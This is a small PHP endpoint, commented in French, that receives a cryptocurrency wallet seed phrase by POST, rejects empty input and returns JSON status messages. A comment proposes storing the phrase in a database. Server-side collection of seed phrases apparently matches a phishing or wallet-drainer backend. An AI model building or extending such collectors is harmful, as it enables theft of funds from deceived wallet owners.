<?php
header('Content-Type: application/json'); // Assurez-vous que le contenu est renvoyé en JSON

// Vérifier si la seedPhrase est envoyée via POST
if (isset($_POST['seedPhrase'])) {
    $seedPhrase = $_POST['seedPhrase'];

    // Vous pouvez ajouter une validation ici pour vérifier la format ou longueur de la seed phrase
    if (empty($seedPhrase)) {
        echo json_encode(['status' => 'error', 'message' => 'Seed phrase cannot be empty']);
        exit();
    }

    // Traitement de la seed phrase (par exemple, la stocker dans une base de données ou l'utiliser d'une autre manière)
    // Pour l'exemple, on renvoie simplement la seed phrase reçue
    echo json_encode(['status' => 'success', 'message' => 'Seed phrase received successfully']);
} else {
    echo json_encode(['status' => 'error', 'message' => 'No seed phrase received']);
}
?>
